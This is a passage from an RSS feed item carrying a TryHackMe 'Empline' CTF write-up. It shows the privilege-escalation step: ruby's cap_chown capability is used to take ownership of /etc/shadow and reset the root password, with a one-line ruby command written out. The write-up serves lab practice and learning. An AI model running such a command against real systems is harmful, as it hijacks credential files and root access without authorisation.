&lt;p&gt;&lt;strong&gt;Linpeas&lt;/strong&gt; shows there are some capabilities user can. ‚Äú&lt;strong&gt;/usr/local/bin/ruby = cap_chown+ep&lt;/strong&gt;‚Äù means user can change any file‚Äôs owner with ruby. I change ‚Äú&lt;strong&gt;/etc/shadow&lt;/strong&gt;‚Äù file‚Äôs owner because if user write the shadow file then can change the root‚Äôs password.&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;n&quot;&gt;ruby&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;require &quot;fileutils&quot;; FileUtils.chown &quot;george&quot;, &quot;george&quot;, &quot;/etc/shadow&quot;&apos;&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/17.png&quot; alt=&quot;17.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I changed root‚Äôs password. Let‚Äôs try to login root.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/18.png&quot; alt=&quot;18.png&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;thank-you-for-reading-&quot;&gt;THANK YOU FOR READING üôÇ&lt;/h3&gt;

</description>
        <pubDate>Thu, 24 Nov 2022 00:00:00 +0300</pubDate>
        <link>http://localhost:4000/TryHackMe-Empline/</link>
        <guid isPermaLink="true">http://localhost:4000/TryHackMe-Empline/</guid>
        
        <category>red</category>
        
        <category>yellow</category>
        
        
        <category>TryHackMe</category>
        
        <category>CTF</category>
        
        <category>Writeup</category>
        
      </item>
    
  </channel>
</rss>
